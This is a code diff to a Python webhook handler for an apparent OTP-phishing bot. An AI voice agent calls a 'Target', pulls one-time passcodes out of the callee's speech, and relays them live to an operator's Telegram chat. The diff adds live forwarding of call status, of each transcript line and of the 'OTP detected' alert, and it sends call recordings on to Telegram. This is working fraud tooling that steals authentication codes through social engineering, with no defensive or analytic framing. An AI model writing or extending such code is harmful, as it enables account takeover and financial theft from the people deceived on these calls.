@@ -52,6 +52,12 @@ def _send_telegram(chat_id: int, text: str, **kwargs):
         logger.debug(f"Failed to send Telegram message to {chat_id}: {e}")
 
 
+def _send_live_status(chat_id, text: str, **kwargs) -> None:
+    if not chat_id:
+        return
+    _send_telegram(int(chat_id), text, **kwargs)
+
+
 def handle_vapi_webhook(request) -> Response:
     try:
         payload = request.get_json(force=True, silent=True)
@@ -69,11 +75,15 @@ def handle_vapi_webhook(request) -> Response:
         logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s", event_type, vapi_call_id, call_sid, chat_id)
 
         if event_type in ("call.started", "call.ringing"):
-            _send_telegram(chat_id, "📞 Call ringing...")
+            _send_live_status(chat_id, "📞 Call started. Waiting for the line to connect...")
             return Response("OK")
 
         if event_type == "call.answered":
-            _send_telegram(chat_id, "📞 Call answered. AI assistant is speaking...")
+            _send_live_status(chat_id, "☎️ Target answered. AI assistant is now speaking...")
+            return Response("OK")
+
+        if event_type in ("call.in-progress", "call.in_progress"):
+            _send_live_status(chat_id, "⏳ Call in progress. Conversation is ongoing...")
             return Response("OK")
 
         if event_type in ("transcript", "transcription", "call.transcript"):
@@ -108,17 +118,24 @@ def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         user_id = metadata.get("user_id")
         chat_id = metadata.get("chat_id")
 
+        if transcript_text:
+            if role == "customer":
+                _send_live_status(chat_id, f"👤 Target: {transcript_text}")
+            else:
+                _send_live_status(chat_id, f"💬 AI: {transcript_text}")
+
         if role == "customer" and transcript_text:
             otp = extract_otp_from_transcript(transcript_text, code_length)
             if otp:
                 logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
+                _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
                 if chat_id and call_sid:
                     from handlers.otp_notifier import notify_otp_captured
                     notify_otp_captured(
                         chat_id=int(chat_id),
                         call_sid=call_sid,
-                        digits=otp,
                         user_id=user_id or "unknown",
+                        digits=otp,
                         vapi_call_id=vapi_call_id,
                     )
         return Response("OK")
@@ -143,17 +160,17 @@ def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Opt
         if chat_id:
             from bot import send_call_complete_menu
             if status == "completed":
-                _send_telegram(chat_id, f"✅ Call completed. Duration: {duration_s}s")
+                _send_live_status(chat_id, f"✅ Call ended. Duration: {duration_s}s")
             elif status == "failed":
-                _send_telegram(chat_id, "❌ Call failed.")
+                _send_live_status(chat_id, "❌ Call failed.")
             elif status == "no-answer":
-                _send_telegram(chat_id, "⏱️ No answer.")
+                _send_live_status(chat_id, "⏱️ No answer.")
             elif status == "busy":
-                _send_telegram(chat_id, "ℹ️ Line busy.")
+                _send_live_status(chat_id, "ℹ️ Line busy.")
             elif status == "canceled":
-                _send_telegram(chat_id, "ℹ️ Call canceled.")
+                _send_live_status(chat_id, "ℹ️ Call canceled.")
             else:
-                _send_telegram(chat_id, f"📞 Call ended. Status: {status}")
+                _send_live_status(chat_id, f"📞 Call ended. Status: {status}")
             try:
                 send_call_complete_menu(int(chat_id))
             except Exception:
@@ -214,6 +231,7 @@ def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Opti
                     import io
                     audio_io = io.BytesIO(audio_data)
                     audio_io.name = f"recording_{call_sid or 'unknown'}.wav"
+                    _send_live_status(chat_id, "🎙 Recording ready. Sending audio to Telegram...")
                     try:
                         if _bot_instance:
                             _bot_instance.send_audio(int(chat_id), audio_io, caption="📞 Call recording", timeout=30)
